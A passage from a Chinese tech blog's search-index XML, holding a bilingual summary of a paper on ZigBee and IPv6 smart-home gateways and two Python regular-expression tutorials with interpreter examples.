aiming terminal node in return. Since all appliances have their own IP addresses based on the IPv6, they can be directly connected to external network. So all appliances can be not only controlled locally and centrally through the hand remote control device at home but also can be controlled by the long-distance PC, which entered the home gateway machine through the Internet. 智能家居网络的结构需要三个不同的设备:协调器、路由器和终端设备。家庭环境可以被监控,所需的数据可以通过协调器或家庭网关传递。程序执行后，适当的控制命令将从家庭网关通过协调器到达网关家电。图1显示了家庭网络架构。 一个低成本高性能的监控内部网系统能够通过ZigBee技术来实现。一个终端节点首先将数据发送到协调器节点，然后协调器节点转发数据到目标终端节点作为回报。因为所有的家用电器都有自己基于IPv6的IP地址，他们可以直接连接到外部网络。因此，所有的设备都不仅可以在家里通过手遥控装置进行本地和集中控制，而且也可以由通过互联网进入家庭网关机器的远程电脑控制。 家庭网关的初步设计 The home wireless network often adopts star topological structure, and is made of home gateway and several ZigBee sensors node module. Home gateway is a full-featured device, which acts as a network coordinator for a network establishment and normal operation. It is also an easy and effective way to control the intelligent home devices outside or in other place through mobile module embedded in gateway for remote user. Mobile terminals include PDAs, remote controllers and mobile phones. The mobility of the terminals can be managed through IPv6 mobility support. In this way, users can complete the operation over the Internet in public places to improve the system’s flexibility and maneuverability. Figure2 illustrates home gateway architecture with information appliance. 家庭无线网络通常采用星型拓扑结构，是由家庭网关和几个ZigBee传感器节点模块组成。家庭网关是一个功能齐全的设备,扮演着网络协调者的角色，用于网络建立和正常运作。在外面或者在其他地方通过为远程用户的移动模块嵌入网关也是一种简单而有效的控制智能家庭设备方法。移动终端包括掌上电脑、遥控器和移动电话。移动终端可以通过通过IPv6流动性支持来进行管理。通过这种方法，用户在公共场所可以在互联网上完成操作来提高系统的灵活性和可操作性。图2说明了家庭网关体系结构的信息设备。 家庭网关和设备之间的通信 The control center of network is home gateway system, which is, from inside, to coordinate all household appliances, control their working condition and inquiry their current status, and, from outside, connect with Internet, receive remote users’ instructions and transfer related information to business sites. Internal Communication. Every data transmit between ZigBee network can be communicated by each other, so people in any room can control the other room’s devices. The query flow-work of home appliance is shown as follows: Appliance receives information fromhome gateway by ZigBee module and detects the household appliance’s status, then corresponding status will be transmitted to the home gateway by ZigBee module. If all appliances work properly, home gateway stores appliances’ status. If not, home gateway reports an error message to supplier. External Communication. Home gateway interconnects Internet and the home network. It sends all devices information in home network to the portal server via TCP/IP socket. And also it can control and monitor the devices with date packet communication. Thus it enables users to control and monitor the home networks through Internet and even mobile phone since the portal server has the mobile interface. The control flow-work of home appliance is shown as follows: Home gateway receives external packets, then unpacks and gets the destination address. The next step is to select routing (destination appliance) and then transmit the data. Appliance receives the data and tests them. If the data are error, the appliance then returns an unsuccessful message to the home gateway. If proper, appliance implements corresponding operation and returns the operation information to home gateway. 网络的控制中心是家庭网关系统，从内来说它是协调所有家用电器，控制其工作状况并查询其当前状态，从外来说它是连接互联网，接收远程用户的指令并将相关信息传送到商业站点。 内部通信。每一个在ZigBee网络传输的数据都能够被相互送达，所以人们在任何房间可以控制其他房间的设备。 家电的查询工作流程如下所示：设备通过ZigBee模块从家庭网关接收信息，并检测家用电器的状态，然后相应的状态信息将会通过ZigBee模块传送到家庭网关。如果所有家电正常工作，家庭网关存储家电的状态。如果不是，家庭网关报告一个错误信息给供应商。 外部通信。家庭网关连接互联网和家庭网络。它通过TCP / IP套接字将家庭网络中的所有设备信息发送到门户服务器。它也可以控制和监控设备通过数据包通信。因此，允许用户通过互联网甚至是移动电话来控制和监控家庭网络，因为门户服务器有手机接口。 家电的控制工作流程如下所示：家庭网关接收到外部包，然后解包得到目的地址。下一步是选择路由（目的家电）并且传输数据。设备接收数据，并测试它们。如果数据是错误的，家电会返回一个不成功消息到家庭网关。如果正确，家电执行相应的操作并将操作信息返回给家庭网关。 家庭网络协议 The protocol enables whole devices to be aware of the status updates of other devices by questioning periodically. To support this, three types of packets are defined in protocol: request packet, response packet and event packet. Those packets are identified with the packet type field in the packet header.There are four main codes for controlling as follows: Name code. The appliance name affects its label. Every information appliance has a relevant name. Different embedded electric appliance systems must have different appliance labels identical to the appliance word set in the system. State code. Another important message is the device state code. It is returned from the embedded system to tell the management interface what status appliances are currently in. An example is“//Power on=on/Power off=off/Probe temperature=24/Turn up=off/Strong wind=on//”. Management can list device state codes directly on the page to tell the user the state of a device. Command code. The protocol provides variable-length packet structure that is composed of 1-byte command code and input/return arguments. Using this type of message makes it easy to incorporate protocol into white goods such as air conditioner and microwave oven etc. The devices need to interpret the command codes and gateway that wants to control devices should be able to compose every type of message that has to be interpreted by each device. Home code. Home network protocol defines home code to make a home network to be independent from others in packet level communication. It looks a home as a close network that is necessary to be private from neighbors. Basically home code is generated into random 4 bytes value and is used to prevent neighbor’s data from coming over and interfering with. 这个协议通过定期的询问使得所有的设备能够意识到其他设备的状态更新。为了实现这个，协议中定义了三种类型的包：请求数据包、响应包和事件包。这些数据包通过数据包头部的数据包类型字段被识别。有四个主要控制代码如下： 名称码：设备名称影响它的标签。每一个信息设备都有相关的名称。不同的嵌入式电器系统必须有不同的设备标签相同的设备字集在系统中。 状态码：另一个重要的消息是设备状态码。它从嵌入系统被返回告诉管理界面家电设备目前的状态。一个例子是“//Power on=on/Power off=off/Probe temperature=24/Turn up=off/Strong wind=on//”。管理系统可以直接在页面上列出设备状态码来告诉用户设备的状态。 指令码：协议提供了变长数据包结构，由1个字节命令码和输入/返回参数。使用这种类型的消息使它很容易将协议合并到大型家电，例如空调、微波炉等。这些设备需要解释命令码，并且想要控制设备的网关应该能够组成每一种类型的消息，因为它必须被每一个设备解释执行。 家庭码：家庭网络协议定义了家庭代码使其在包级别的通信中与其他的独立起来。看起来好像一个家庭就是一个关闭的网络，这有必要远离邻居。基本的家庭代码被生成随机的4字节的值，它被用来防止邻居的数据过来和干扰。 ZigBee/ 802.15.4和IPv6/802.3网络之间的网络互连 ZigBee is the most popular wireless network communication technology. Since the TCP/IP has become the dominant protocol in the Internet due to its widespread use and reliability, and also the 802.3 Ethernet is networking standard, the demand for internetworking between ZigBee/802.15.4 and TCP/IP/802.3 is inevitable. However, the ZigBee itself is not compatible with the IP-based network. It is a great challenge to integrate these two kinds of networks together. In general, Sensor networks and IP can play together by means of three approaches:(1) The straight forward method to make IPv6 work over ZigBee is to put the IPv6 stack on the top of ZigBee NWK layer. All the ZigBee nodes are assigned with an IPv6 address.(2) Another approach is IP-Net. It is a dual stack approach. Both the 6LoWPAN design and ZigBee stack are working on the same 802.15.4 MAC.(3) A gateway that allows both a 6LoWPAN and Zigbee device indifferently to be converted to IPv6, would be desirable. If we apply the IP-NET concept of a dual stack in one side of the gateway, we can obtain an interoperable gateway. ZigBee是最受欢迎的无线网络通信技术。由于TCP / IP 的广泛使用和可靠性，它已经成为互联网中占主导地位的协议，以及802.3以太网是网络的标准，因此ZigBee/ 802.15.4和TCP / IP / 802.3之间的网络互连是必然的。然而，ZigBee本身并不兼容的基于ip的网络。集成这两种网络连接在一起是一个巨大的挑战。通常，传感网络与IP可以通过以下三种方法连接在一起：（1）让IPv6工作在ZigBee之上的直接的方法是将IPv6协议栈放在ZigBee NWK层的顶部。所有的ZigBee节点分配一个IPv6地址。（2）另一种方法是IP-Net。这是一个双栈的方法。6 lowpan设计和ZigBee栈都工作在802.15.4 MAC层。（3）一个允许一个6 lowpan和ZigBee设备被转换成IPv6的网关将是可取的。如果我们在网关的一边应用IP-NET双栈的概念，我们可以获得一个能共同操作的网关。 智能家居装置 The appliance receives information from home gateway by ZigBee module and then generates corresponding signals to manipulate the smart appliances. As long as the signal being detected by the sensors of the terminal nodes, it will be transmitted to the home gateway by ZigBee module, to deal with corresponding task. To achieve remote control, the terminal device is formed with the network terminals and micro-controller. Appliance control module connected with executing system can get commands from the network termination module and operate home appliances. The network terminal module is the core of information appliance system, which allows access to IPv6 network appliances, and serves as an embedded web server to respond to the request of the client. The appliance automatically gets the routing prefix of 64-bit of IPv6 distributed by network processor. Together with the existing 64-bit interface identifier for each household appliance, it can form the world’s sole128-bit IPv6 address. In order to reduce costs and improve network efficiency, appliances can be classified as smart appliances and non-smart appliances according to the function. Corresponding node can be divided into normal and complex control node. Smart appliances, such as air conditioning, only need to realize switching function. Non-smart appliances, such as television, not only realize switching function, but also require complex instruction to realize some other functions. 这个装置通过ZigBee模块从家庭网关接收信息，然后生成相应的信号来控制智能家电。只要信号被终端节点的传感器检测到。它将通过ZigBee模块传送给家庭网关去处理相应的任务。 为了实现远程控制，终端设备由网络终端和微控制器组成。与执行系统相连的装置控制模块可以从网络终端模块得到命令和操作家用电器。网络终端模块是信息设备系统的核心，它允许访问IPv6网络家电和作为嵌入式web服务器响应客户机的请求。设备自动获得由网络处理器分配的IPv6 64位路由前缀。结合现有的每一个家用电器的64位接口标识符，它可以形成世界唯一的128位IPv6地址。 为了降低成本和提高网络效率，家电能够根据功能被分类为智能设备和非智能设备。相应的节点可以分为正常的和复杂的控制节点。智能家电，例如空调，只需要实现切换功能。非智能家电，例如电视，不但实现切换功能，而且也需要复杂指令来实现其他功能。 智能电表和家电节能控制 Smart utility meters play an important role in the energy aware scheme. The backbone of the smart grid is the AMI that typically involves the installation of smart meters that remotely read electricity consumption, remotely connect and disconnect service, and deliver prepaid electricity to customers. Achieving it requires a monitoring and control solution that involves makers of home appliances, home controls, and in-home displays. An integrated, high-performance, GUI technology keeps consumers informed. The home energy management system relies on the power consumption history to control appliances and consists of a group of functions that facilitate remote monitoring, controlling, planning and repairing of operations and provide information on the status of installed devices and the network. The system includes micro-generation which allows customers to be net buyers or sellers of electricity at different times and with different tariffs. When controlling home appliances, interconnection between appliances should be considered, especially these have positive connection. At that time, peer to peer network is often required instead of star network. There is a typical example to illustrate the coordination between air conditioning and water heater. Both of them are the maximum power consumption appliances. But if we input the cold water released from the heating equipment of heater to the refrigeration equipment of air conditioning, while input the heat released from the refrigeration equipment to the heating equipment of heater, maximum power will be saved by the two-way recycling use. 智能电表在能源意识计划中发挥了重要作用。智能电网的骨干是AMI，它通常涉及到智能电表的安装，远程读表、远程连接和断开服务，并提供预付电费客户。实现它需要一个监视和控制的解决方案，它涉及家用电器制造商、家庭控制装置和家庭显示器。一个集成的、高性能、GUI技术使消费者被通知。家庭能源管理系统依靠电力消费历史来控制家电，由一组功能组成来促进远程监视、控制、计划和修复操作。并提供安装设备的状态和网络信息。该系统包括微产能，它允许客户在不同的时间并且以不同的价格作为电的净买家或卖家。 在控制家用电器的时候，家用电器之间的互连需要被考虑，尤其是这些有实际连接件的。那时候，点对点网络通常被要求替换星型网络。有一个典型的例子来说明空调和热水器之间的协作。他们都是最大功耗家电。但是，如果我们输入来自热水器加热设备释放的冷水到空调的制冷设备，然而，来自空调制冷设备的热水输入到热水器的加热设备，通过双向循环利用最大功率将被节省。 结论 Existing technologies can be integrated using IPv6 and ZigBee to provide a manageable wireless home network. The home energy management system offers a simple approach to help homeowners save household energy and offers a new way of life devoted to a greener, better intelligent to everyone. 现有技术可以集成使用IPv6和无线个域网提供可控的无线家庭网络。家庭能源管理系统提供了一种简单的方法来帮助房主节省家庭能源,并给每个人提供了一种新的致力于环保的生活方式和更好的智能。]]></content>
      <categories>
        <category>论文研读</category>
      </categories>
      <tags>
        <tag>IPv6</tag>
        <tag>ZigBee</tag>
        <tag>智能家居</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式函数]]></title>
    <url>%2F2017%2F01%2F21%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%87%BD%E6%95%B0%2F</url>
    <content type="text"><![CDATA[Python 的 re 模块（Regular Expression 正则表达式）提供各种正则表达式的匹配操作，在文本解析、复杂字符串分析和信息提取时是一个非常有用的工具。本博客介绍了 re 模块的一些常用函数。 re.compile()函数 re 模块提供了一个正则表达式引擎的接口，可以把正则表达式编译成一个正则表达式对象并用它们来进行匹配。 1re.compile(strPattern[, flag]) 把那些经常使用的正则表达式编译成正则表达式对象，这样可以提高一定的效率。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; p = re.compile(&apos;a&#123;1,3&#125;&apos;)&gt;&gt;&gt; print p&lt;_sre.SRE_Pattern object at 0x033992C0&gt;&gt;&gt;&gt; p.findall(&apos;babaabaaa&apos;)[&apos;a&apos;, &apos;aa&apos;, &apos;aaa&apos;]&gt;&gt;&gt; p.findall(&apos;abaababa&apos;)[&apos;a&apos;, &apos;aa&apos;, &apos;a&apos;, &apos;a&apos;] 编译标志 编译标志让你可以修改正则表达式的一些运行方式。在 re 模块中标志可以使用两个名字，一个是全名如 IGNORECASE，一个是缩写，一字母形式如 I。 标志含义: DOTALL, S使 . 匹配包括换行在内的所有字符 IGNORECASE, I使匹配对大小写不敏感 LOCALE, L做本地化识别（locale-aware）匹配 MULTILINE, M多行匹配，影响 ^ 和 $ VERBOSE, X能够使用 REs 的 verbose 状态，使之被组织得更清晰易懂 I，IGNORECASE，使匹配对大小写不敏感；字符类和字符串匹配字母时忽略大小写。举个例子，[A-Z]也可以匹配小写字母，Spam 可以匹配 “Spam”, “spam”, 或 “spAM”。这个小写字母并不考虑当前位置。 re.match()函数 re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回None。 1re.match(pattern, string, flags=0) 第 1 个参数是正则表达式，这里为”(\w+)\s”，如果匹配成功，则返回一个Match，否则返回一个None； 第 2 个参数表示要匹配的字符串； 第 3 个参数是标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 MatchObject 实例也有几个方法和属性： group()返回被 RE 匹配的字符串 start()返回匹配开始的位置 end()返回匹配结束的位置 span()返回一个元组包含匹配 (开始,结束) 的位置 我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 12345678910&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;www&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()&lt;_sre.SRE_Match object at 0x02897E58&gt; (0, 3) www&gt;&gt;&gt; m = re.match(r&quot;com&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()NoneTraceback (most recent call last): File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;AttributeError: &apos;NoneType&apos; object has no attribute &apos;span&apos; re.search()函数 re.search 扫描整个字符串并返回第一个成功的匹配。 1re.search(pattern, string, flags=0) 参数含义与re.match一样。 匹配成功re.search方法返回一个匹配的对象，否则返回None。我们可以使用group(num) 或 groups() 匹配对象函数来获取匹配表达式。 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.search(r&quot;www&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()&lt;_sre.SRE_Match object at 0x02897E58&gt; (0, 3) www&gt;&gt;&gt; m = re.search(r&quot;com&quot;,&apos;www.fzyLine.com&apos;)&gt;&gt;&gt; print m,m.span(),m.group()&lt;_sre.SRE_Match object at 0x0284DDB0&gt; (12, 15) com re.match与re.search的区别： re.match 只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。 re.sub()函数1re.sub(pattern, repl, string, count) 其中， pattern : 正则中的模式字符串。 repl : 替换的字符串，也可为一个函数。 string : 要被查找替换的原始字符串。 count : 模式匹配后替换的最大次数，默认 0 ，表示替换所有的匹配。 re.sub 还允许使用函数对匹配项的替换进行复杂的处理。如：re.sub(r’\s’, lambda m: ‘[‘ + m.group(0) + ‘]’, text, 0)；将字符串中的空格’ ‘替换为’[ ]’。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\.&quot;&gt;&gt;&gt; re.sub(r,&apos;-&apos;,&apos;www.fzyLine.com&apos;)&apos;www-fzyLine-com&apos; re.subn()函数 subn() 与 sub() 相同，但会返回新的字符串和替换次数。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\.&quot;&gt;&gt;&gt; re.subn(r,&apos;-&apos;,&apos;www.fzyLine.com&apos;)(&apos;www-fzyLine-com&apos;, 2) re.split()函数 re.split可以用来分割字符串，如：re.split(r’\s+’, text)；将字符串按空格分割成一个单词列表。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\.&quot;&gt;&gt;&gt; re.split(r,&apos;www.fzyLine.com&apos;)[&apos;www&apos;, &apos;fzyLine&apos;, &apos;com&apos;] re.findall()函数 re.findall可以获取字符串中所有匹配的字符串。如：re.findall(r’\woo\w‘, text)；获取字符串中，包含’oo’的所有单词。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;a\dc&quot;&gt;&gt;&gt; re.findall(r,&apos;a2cka4cka8c&apos;)[&apos;a2c&apos;, &apos;a4c&apos;, &apos;a8c&apos;] re.finditer()函数 finditer()找到 RE 匹配的所有子串，并把它们作为一个迭代器返回. 1234567891011&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;a\dc&quot;&gt;&gt;&gt; m = re.finditer(r,&apos;a2cka4cka8c&apos;)&gt;&gt;&gt; print m&lt;callable-iterator object at 0x0292A4B0&gt;&gt;&gt;&gt; for i in m:... print i.group()...a2ca4ca8c group函数group([group1,…]) 返回匹配到的一个或者多个子组。如果是一个参数，那么结果就是一个字符串，如果是多个参数，那么结果就是一个参数一个item的元组。 12345678910&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;(\d+),(\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.group()&apos;123,456&apos;&gt;&gt;&gt; m.group(1)&apos;123&apos;&gt;&gt;&gt; m.group(2)&apos;456&apos;&gt;&gt;&gt; m.group(1,2)(&apos;123&apos;, &apos;456&apos;) groups([default]) 返回一个包含所有子组的元组。Default是用来设置没有匹配到组的默认值的。Default默认是None。 123456789&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;(\d+),(\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.groups()(&apos;123&apos;, &apos;456&apos;)&gt;&gt;&gt; m = re.match(r&quot;(\d+),?(\d+)?&quot;,&apos;123&apos;)&gt;&gt;&gt; m.groups()(&apos;123&apos;, None)&gt;&gt;&gt; m.groups(&quot;0&quot;)(&apos;123&apos;, &apos;0&apos;) groupdict([default]) 返回匹配到的所有命名子组的字典。Key是name值，value是匹配到的值。参数default是没有匹配到的子组的默认值。这里与groups()方法的参数是一样的。默认值为None。groupdict()对没有name的子组不起作用，如下： 1234567&gt;&gt;&gt; import re&gt;&gt;&gt; m = re.match(r&quot;(\d+),(\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.groupdict()&#123;&#125;&gt;&gt;&gt; m = re.match(r&quot;(?P&lt;first&gt;\d+),(?P&lt;second&gt;\d+)&quot;,&apos;123,456&apos;)&gt;&gt;&gt; m.groupdict()&#123;&apos;second&apos;: &apos;456&apos;, &apos;first&apos;: &apos;123&apos;&#125;]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python正则表达式基础]]></title>
    <url>%2F2017%2F01%2F20%2FPython%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[正则表达式是一种小型的、高度专业化的编程语言，在Python中通过re模块实现。 正则表达式使用单个字符串来描述、匹配一系列匹配某个句法规则的字符串。 简介 正则表达式是由普通字符（例如字符 a 到 z）以及特殊字符（称为”元字符”）组成的文字模式。模式描述在搜索文本时要匹配的一个或多个字符串。正则表达式作为一个模板，将某个字符模式与所搜索的字符串进行匹配。 使用正则表达式可以： （1）测试字符串内的模式。 例如，可以测试输入字符串，以查看字符串内是否出现电话号码模式或信用卡号码模式。这称为数据验证。 （2）替换文本。 可以使用正则表达式来识别文档中的特定文本，完全删除该文本或者用其他文本替换它。 （3）基于模式匹配从字符串中提取子字符串。 可以查找文档内或输入域内特定的文本。 普通字符 大多数字母和字符一般都会和自身匹配 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;abc&quot;&gt;&gt;&gt; re.findall(r,&apos;abckkkabc&apos;)[&apos;abc&apos;, &apos;abc&apos;] 元字符常用元字符 . 匹配除换行符以外的任意字符 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;.a&quot;&gt;&gt;&gt; re.findall(r,&apos;aabaca&apos;)[&apos;aa&apos;, &apos;ba&apos;, &apos;ca&apos;]&gt;&gt;&gt; re.findall(r,&apos;aabacadd&apos;)[&apos;aa&apos;, &apos;ba&apos;, &apos;ca&apos;] […] 字符集 常用来指定一个字符集：[abc],[a-z] 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;t[io]p&apos;&gt;&gt;&gt; re.findall(r,&apos;top tip ttp tmp&apos;)[&apos;top&apos;, &apos;tip&apos;] 元字符在字符集中不起作用：[…$] 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;t[io$]p&apos;&gt;&gt;&gt; re.findall(r,&apos;top tip ttp tmp t$p&apos;)[&apos;top&apos;, &apos;tip&apos;, &apos;t$p&apos;] 补集匹配不在区间范围内的字符：[^…] 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;t[^io]p&apos;&gt;&gt;&gt; re.findall(r,&apos;top tip ttp tmp t$p&apos;)[&apos;ttp&apos;, &apos;tmp&apos;, &apos;t$p&apos;] ^ 匹配行的开始 匹配行首除非设置MULTILINE标志，它只是匹配字符串的开始。在MULTILINE模式里，它也可以直接匹配字符串中的每个换行。 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;^hi&apos;&gt;&gt;&gt; re.findall(r,&apos;hi, how are you? hi what are you doing?&apos;)[&apos;hi&apos;]&gt;&gt;&gt; re.findall(r,&apos;how are you? hi what are you doing?&apos;)[] $ 匹配行的结束 匹配行尾，行尾被定义为要么是字符串尾，要么是一个换行字符后面的任何位置。 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&apos;you$&apos;&gt;&gt;&gt; re.findall(r,&apos;how are you&apos;)[&apos;you&apos;]&gt;&gt;&gt; re.findall(r,&apos;how are&apos;)[] \ 将下一字符标记为特殊字符、愿意字符、反向引用或八进制转义符。 反斜线后面可以接不同的字符以表示不同特殊意义，也可以用于取消所有元字符。 123456&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\n&quot;&gt;&gt;&gt; re.findall(r,&apos;abc\n&apos;)[&apos;\n&apos;]&gt;&gt;&gt; re.findall(r,&apos;abc\\n&apos;)[] | 指示在两个或多个项之间进行选择。 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab|ac&quot;&gt;&gt;&gt; re.findall(r,&apos;abacad&apos;)[&apos;ab&apos;, &apos;ac&apos;] 预定义字符集 \d 匹配任何十进制数，相当于[0-9] \D 匹配任何非数字字符，相当于[^0-9] \s 匹配任何空白字符，相当于[\t\n\r\f\v] \S 匹配任何非空白字符，相当于[^\t\n\r\f\v] \w 匹配任何字母数字字符，相当于[a-zA-Z0-9] \W 匹配任何非字母数字字符，相当于[^a-zA-Z0-9] 12345678910111213141516171819202122&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;[0-9]&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;]&gt;&gt;&gt; r = r&quot;\d&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;4&apos;]&gt;&gt;&gt; r = r&quot;\D&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;a&apos;, &apos;b&apos;, &apos;c&apos;, &apos;d&apos;, &apos; &apos;, &apos;.&apos;, &apos;;&apos;, &apos;-&apos;, &apos;!&apos;]&gt;&gt;&gt; r = r&quot;\s&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos; &apos;]&gt;&gt;&gt; r = r&quot;\S&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;a&apos;, &apos;b&apos;, &apos;3&apos;, &apos;4&apos;, &apos;c&apos;, &apos;d&apos;, &apos;.&apos;, &apos;;&apos;, &apos;-&apos;, &apos;!&apos;]&gt;&gt;&gt; r = r&quot;\w&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos;1&apos;, &apos;2&apos;, &apos;a&apos;, &apos;b&apos;, &apos;3&apos;, &apos;4&apos;, &apos;c&apos;, &apos;d&apos;]&gt;&gt;&gt; r = r&quot;\W&quot;&gt;&gt;&gt; re.findall(r,&apos;12ab34cd .;-!&apos;)[&apos; &apos;, &apos;.&apos;, &apos;;&apos;, &apos;-&apos;, &apos;!&apos;] 常用重复限定符 字符 表示前一个字符可以被匹配零次或者任意多次，而不是只有一次。匹配引擎会试着重复尽可能多的次数。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab*&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abb&apos;)[&apos;abb&apos;] 字符 表示前一个字符可以被匹配一次或任意多次。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab+&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abb&apos;)[&apos;abb&apos;] 注意： * 与 + 之间的不同：* 匹配零次或任意多次，所以可以根本就不出现，但是 + 则要求至少出现一次。 ? 字符 表示前一个字符可以被匹配一次或零次：可以认为它用于标识某事物是可选的。 12345678&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab?&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abb&apos;)[&apos;ab&apos;] 贪婪模式与非贪婪模式： 贪婪匹配:正则表达式一般趋向于最大长度匹配，也就是所谓的贪婪匹配。 非贪婪匹配：就是匹配到结果就好，最少的匹配字符。 默认是贪婪模式；在量词后面直接加上一个问号？就是非贪婪模式。 1234567891011&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;ab+&quot;&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abbb&apos;)[&apos;abbb&apos;]&gt;&gt;&gt; r = r&quot;ab+?&quot;&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;ab&apos;]&gt;&gt;&gt; re.findall(r,&apos;abbb&apos;)[&apos;ab&apos;] {m, n}限定范围 其中 m 和 n 是十进制整数。该限定符的意思是至少有 m 个重复，至多到 n 个重复。 忽略 m 会认为下边界是0，而忽略n的结果将是上边界为无穷大 {0,}等同于 ，{1,}等同于 + ，而{0,1}则与?相同。如果可以的话，最好用 , + 或 ? 1234567891011121314151617181920212223&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;a&#123;1,3&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;a&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;aa&apos;)[&apos;aa&apos;]&gt;&gt;&gt; re.findall(r,&apos;aaa&apos;)[&apos;aaa&apos;]&gt;&gt;&gt; re.findall(r,&apos;aaaa&apos;)[&apos;aaa&apos;, &apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;ab&apos;)[&apos;a&apos;]&gt;&gt;&gt; re.findall(r,&apos;b&apos;)[]&gt;&gt;&gt; r = r&quot;a&#123;0,&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;aaaaa&apos;)[&apos;aaaaa&apos;, &apos;&apos;]&gt;&gt;&gt; r = r&quot;a&#123;1,&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;aaaaa&apos;)[&apos;aaaaa&apos;]&gt;&gt;&gt; r = r&quot;a&#123;0,1&#125;&quot;&gt;&gt;&gt; re.findall(r,&apos;aaaaa&apos;)[&apos;a&apos;, &apos;a&apos;, &apos;a&apos;, &apos;a&apos;, &apos;a&apos;, &apos;&apos;] 特殊应用忽略大小写(?i) 用于忽略大小写匹配 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;(?i)ab&quot;&gt;&gt;&gt; re.findall(r,&apos;AbABabcd&apos;)[&apos;Ab&apos;, &apos;AB&apos;, &apos;ab&apos;] 单词分界符\b 表示单词分界符 1234&gt;&gt;&gt; import re&gt;&gt;&gt; r = r&quot;\bhi\b&quot;&gt;&gt;&gt; re.findall(r,&apos;his him hi history&apos;)[&apos;hi&apos;]]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基础详解-字典]]></title>
    <url>%2F2017%2F01%2F13%2FPython%E5%9F%BA%E7%A1%80%E8%AF%A6%E8%A7%A3-%E5%AD%97%E5%85%B8%2F</url>
